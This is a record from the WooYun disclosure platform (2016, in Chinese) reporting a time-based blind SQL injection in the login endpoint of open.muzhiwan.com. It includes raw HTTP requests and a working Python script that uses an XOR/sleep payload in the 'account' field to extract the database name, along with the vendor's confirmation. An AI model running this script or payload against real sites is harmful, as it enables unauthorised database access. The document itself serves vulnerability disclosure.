{"id": 75489, "wybug_id": "wooyun-2016-0167338", "wybug_title": "拇指玩某站MySQL盲注(附验证脚本)", "wybug_corp": "muzhiwan.com", "wybug_author": "hecate", "wybug_date": "2016-01-04 21:50", "wybug_open_date": "2016-02-12 18:49", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-12：\t细节向公众公开  简要描述： (づ￣ 3￣)づ 详细说明：  和这个洞是同一站点  WooYun: 拇指玩一处SQL注入可控制千万用户数据 \nPOST /?action=public&opt=check_username HTTP/1.1Host: open.muzhiwan.comUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:43.0) Gecko/20100101 Firefox/43.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh,en-US;q=0.7,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://open.muzhiwan.com/?action=public&opt=loginContent-Length: 13Cookie: PHPSESSID=86etm3velh28pgfdint4e3tvb2X-Forwarded-For: 127.0.0.1'Connection: keep-aliveaccount=admin\n上面的 account 参数有过滤，而下面这个post中的 account 就没有过滤，╮(╯▽╰)╭ \nPOST /?action=public&opt=loginin HTTP/1.1Host: open.muzhiwan.comUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:43.0) Gecko/20100101 Firefox/43.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh,en-US;q=0.7,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://open.muzhiwan.com/?action=public&opt=loginContent-Length: 43Cookie: PHPSESSID=86etm3velh28pgfdint4e3tvb2X-Forwarded-For: 127.0.0.1'Connection: keep-aliveaccount=admin&password=111111111&remember=1\n附脚本\n#!/usr/bin/python# -*- coding: UTF-8 -*-import httplibimport timeimport stringimport sysimport randomimport urllibimport mathheaders = {'Content-Type':'application/x-www-form-urlencoded'}payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'print 'Starting to retrive MySQL DB:'db= ''for i in range(1, 4):    for payload in payloads:            s = \"account=admin'XOR(if(now()=sysdate(),sleep(if(ascii(mid(database(),%s,1))=%s,5,0)),0))OR'&password=111111111&remember=1\" % (i, ord(payload))            conn = httplib.HTTPConnection('open.muzhiwan.com', timeout=60)            conn.request(method='POST',                         url='/?action=public&opt=loginin',                         body=s,                         headers=headers)            start_time = time.time()            conn.getresponse()            conn.close()            print '.',            if time.time() - start_time > 5.0:                db += payload                print '\\n\\n[In progress]', db,                breakprint '\\n\\n[Done] MySQL DB is %s' % db\n   漏洞证明：  \n\n   修复方案：  过滤   版权声明：转载请注明来源 hecate@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-01-05 10:09 厂商回复： 你好，我们会尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}